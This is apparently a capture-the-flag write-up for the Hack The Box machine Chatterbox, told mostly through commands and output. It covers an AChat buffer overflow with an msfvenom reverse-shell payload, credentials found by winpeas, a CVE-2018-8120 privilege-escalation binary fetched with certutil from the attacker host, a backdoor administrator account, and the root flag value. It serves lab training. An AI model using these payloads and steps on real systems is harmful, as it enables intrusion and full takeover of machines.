
### Initial access
Nmap scan
```
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  tcpwrapped   syn-ack ttl 127
9256/tcp  open  achat        syn-ack ttl 127 AChat chat system
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

```

After nmap resarch on port 9255 we found info abou exploit
```bash
┌──(kali㉿kali)-[~/HTB/Chatterbox]
└─$ searchsploit AChat
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                                                                                  | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                                                                                     | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                        | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                                                                                          | php/webapps/24647.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Chatterbox]
└─$ searchsploit -m windows/remote/36025.py 
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
    Codes: CVE-2015-1578, CVE-2015-1577, OSVDB-118206, OSVDB-118104
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (637)
Copied to: /home/kali/HTB/Chatterbox/36025.py



```

We modify shellcode base on this using metaslploit and put a shell code to the exploit to get revshell
```
msfvenom -a x86 --platform Windows \
  -p windows/shell_reverse_tcp LHOST=10.10.16.212 LPORT=443 \      
  -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

```

```cmd 

┌──(kali㉿kali)-[~/HTB/Chatterbox]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.212] from (UNKNOWN) [10.129.40.200] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Windows\system32>



```
### Lateral Movement
### Priv escalation

We run winpeas
```
����������͹ Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultUserName               :  Alfred
    DefaultPassword               :  Welcome1!

����������͹ Scheduled Applications --Non Microsoft-- (T1053.005)
� Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html                                                                                                                               
    (CHATTERBOX\Alfred) Reset AChat service: "C:\Users\Alfred\AppData\Local\Microsoft\Windows Media\reset.bat" 
    Permissions file: Alfred [Allow: AllAccess]
    Permissions folder(DLL Hijacking): Alfred [Allow: AllAccess]
    Trigger: At 5:10 PM on 1/30/2018-After triggered, repeat every 00:01:00 indefinitely.
             At 5:10 PM on 1/30/2018-After triggered, repeat every 00:01:00 indefinitely.
             At 5:10 PM on 1/30/2018-After triggered, repeat every 00:01:00 indefinitely.
    

```

After searching we test runing latest cve on win7
https://github.com/qiantu88/CVE-2018-8120.git
```bash
                                                                             wget -O CVE-2018-8120.exe "https://github.com/qiantu88/CVE-2018-8120/raw/master/CVE-2018-8120/Release/CVE-2018-8120.exe"

                            
```

```cmd

C:\tmp>certutil -urlcache -split -f http://10.10.16.212/CVE-2018-8120.exe  C:\tmp\CVE-2018-8120.exe 
certutil -urlcache -split -f http://10.10.16.212/CVE-2018-8120.exe  C:\tmp\CVE-2018-8120.exe 
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\tmp>CVE-2018-8120.exe "whoami"
CVE-2018-8120.exe "whoami"
CVE-2018-8120 exploit Change by @Topsec_Alpha_lab(https://github.com/alphalab)
[+] Trying to execute whoami as SYSTEM...
[+] Process created with pid 3848!
nt authority\system

C:\tmp>CVE-2018-8120.exe "net user anh anh /add"
CVE-2018-8120.exe "net user anh anh /add"
CVE-2018-8120 exploit Change by @Topsec_Alpha_lab(https://github.com/alphalab)
[+] Trying to execute net user anh anh /add as SYSTEM...
[+] Process created with pid 5604!
The command completed successfully.



C:\tmp>CVE-2018-8120.exe "net localgroup Administrators anh /add"
CVE-2018-8120.exe "net localgroup Administrators anh /add"
CVE-2018-8120 exploit Change by @Topsec_Alpha_lab(https://github.com/alphalab)
[+] Trying to execute net localgroup Administrators anh /add as SYSTEM...
[+] Process created with pid 5572!
The command completed successfully.



C:\tmp>


```
We use mfconsle to cretre revershell and although we have nt system priv but the file have acl we have to modify it to read flag

```bash

                                                                                                                                                                                             
┌──(kali㉿kali)-[~/oscp/exploit-tool]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.212 LPORT=4444 -f exe -o tmp.exe         
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
Saved as: tmp.exe

┌──(kali㉿kali)-[~/HTB/Chatterbox]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.212] from (UNKNOWN) [10.129.40.214] 49169
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\tmp>whoami
whoami
nt authority\system
C:\Users\Administrator\Desktop>takeown /f C:\Users\Administrator\Desktop\root.txt
takeown /f C:\Users\Administrator\Desktop\root.txt

SUCCESS: The file (or folder): "C:\Users\Administrator\Desktop\root.txt" now owned by user "WORKGROUP\CHATTERBOX$".

C:\Users\Administrator\Desktop>icacls C:\Users\Administrator\Desktop\root.txt /grant SYSTEM:F
icacls C:\Users\Administrator\Desktop\root.txt /grant SYSTEM:F
processed file: C:\Users\Administrator\Desktop\root.txt
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator\Desktop>type root.txt
type root.txt
1fb4b9707267e5cedf5fa57abc728319



```